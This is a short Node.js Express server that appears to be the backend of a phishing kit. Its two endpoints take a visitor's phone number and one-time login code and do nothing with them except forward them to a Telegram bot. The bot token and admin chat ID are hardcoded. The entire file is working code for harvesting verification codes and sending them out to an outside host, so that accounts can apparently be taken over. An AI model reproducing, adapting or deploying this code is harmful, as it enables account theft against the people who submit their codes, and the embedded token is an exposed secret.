const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const PORT = process.env.PORT || 3000;

// የእርስዎ ትክክለኛ የቦት ቶከን እና አድሚን ቻት አይዲ
const BOT_TOKEN = '9062994222:AAF4my5zXC5SDlZyHFyfVnR0VPONoRtQiW4';
const ADMIN_CHAT_ID = '7184853477';

async function sendToTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: text,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) {
        console.error('Error sending bot message:', e);
    }
}

app.get('/', (req, res) => {
    res.send('Backend is running smoothly!');
});

app.post('/api/send-code', async (req, res) => {
    const { phone } = req.body;
    console.log(`Phone received: ${phone}`);
    await sendToTelegram(`📱 *New Phone Number Received!*\nNumber: \`${phone}\``);
    res.json({ success: true });
});

app.post('/api/verify-code', async (req, res) => {
    const { phone, code } = req.body;
    console.log(`Code received for ${phone}: ${code}`);
    await sendToTelegram(`🔑 *New OTP Code Received!*\nPhone: \`${phone}\`\nCode: \`${code}\``);
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});